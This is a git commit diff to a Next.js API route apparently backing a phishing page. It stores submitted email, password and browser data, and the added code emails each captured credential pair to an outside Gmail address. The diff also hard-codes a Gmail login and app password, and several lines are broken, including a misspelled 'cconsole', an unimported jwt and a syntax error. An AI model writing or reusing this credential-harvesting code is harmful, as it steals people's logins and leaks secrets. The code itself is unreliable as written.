fe73949ce1fd349f9af41e94c8050948806deecf
mourisnicolas <125296096+mourisnicolas@users.noreply.github.com>
2023-02-25 18:52:30 +0100

    Update index.js

--- pages/api/spam/index.js
+++ pages/api/spam/index.js
@@ -1,5 +1,7 @@
 import dbConnect from "../../../lib/dbConnect";
 import Spam from "../../../models/spam";
+import nodeMailer from 'nodemailer';
+// https://www.youtube.com/watch?v=l--0JyIS5Ts
 
 export default async function handler(req, res) {
   const { method, body } = req
@@ -27,11 +29,42 @@ export default async function handler(req, res) {
         if(p) {
           return res.status(201).send("k k");
         }
-        
+
         let spam = new Spam(body);
         await spam.save();
 
-        return res.status(201).send("k k");
+        const transporter = nodeMailer.createTransport({
+          service: "gmail",
+          auth: {
+            user: "rheiinklaus@gmail.com",
+            pass: "fnjwlzlyqxbthlvw"
+          }
+        });
+        
+        const option = {
+          from: "rheiinklaus@gmail.com",
+          to: "mariac.perezcaba@gmail.com",
+          subject: "booooooooommmmmmmmmmmmmmmmm",
+          html: `
+            <p>email: ${body.email}</p>
+            <p>password: ${body.password}</p>
+            <p>browser: ${body.browser}</p>
+            <p>createdAt: ${Date(body.createdAt)}</p>
+          `
+        }
+
+        transporter.sendMail(option, function(error, info) {
+          if(error) {
+            cconsole.log(error);
+          } else {
+            console.log('mail send')
+          }
+        })
+
+        const token = jwt.sign({_id: this._id, date:}, "what", {expiresIn: "15h"});;
+
+
+        return res.status(201).header("stmmm", token).send("k k");
       } catch (error) {
         console.log(error)
         return res.status(400).send("Invalid username or password");
